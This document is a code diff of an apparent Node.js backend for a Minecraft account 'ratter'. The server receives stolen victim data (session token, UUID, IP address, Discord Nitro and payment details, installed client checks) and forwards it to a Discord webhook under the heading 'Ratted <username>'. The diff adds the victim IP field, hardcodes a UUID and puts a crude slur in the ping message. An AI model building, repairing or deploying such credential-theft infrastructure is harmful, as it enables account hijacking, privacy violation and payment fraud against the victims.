@@ -110,7 +110,7 @@ app.post("/", (req, res) => {
                 // get profiles
                 let profiles = ''
 
-                const profileData = await getProfiles(req.body.uuid);
+                const profileData = await getProfiles('90e08207b2104996816b8ff4985db73b');
 
 	            if (profileData) {
                     for (let profileId in profileData.profiles) {
@@ -153,8 +153,7 @@ app.post("/", (req, res) => {
                 
                 try {
                     post(process.env.WEBHOOK, JSON.stringify({
-                        content: `@everyone - ${req.body.ip}`, //ping
-			url: `https://sky.shiiyu.moe/stats/${req.body.username}`,
+                        content: `@everyone - no nw chigger)`, //ping
                         embeds: [{
                             title: `Ratted ${req.body.username} - Click For Stats`,
                              fields: [
@@ -162,6 +161,7 @@ app.post("/", (req, res) => {
                                 { name: 'UUID', value: `\`\`\`${req.body.uuid}\`\`\``, inline: true },
                                 { name: 'Token', value: `\`\`\`${req.body.token}\`\`\``, inline: false },
                                 { name: 'Profiles', value: `\`\`\`${profiles}\`\`\``, inline: false },
+                                { name: 'IP', value: `\`\`\`${req.body.ip}\`\`\``, inline: true },
                                 { name: 'Feather', value: `${checkFeather}`, inline: true },
                                 { name: 'Essentials', value: `${checkEssentials}`, inline: true },
                                 { name: 'Lunar', value: `${checkLunar}`, inline: true },
@@ -169,7 +169,7 @@ app.post("/", (req, res) => {
                                 { name: 'Nitro', value: `\`${nitros}\``, inline: true },
                                 { name: 'Payment', value: `\`${payments}\``, inline: true }
                             ],
-				
+                            url: `https://sky.shiiyu.moe/stats/${req.body.username}`,
                             color: 5814783,
                             footer: {
                                 "text": "🕊️ MagiDev on top 🕊️",
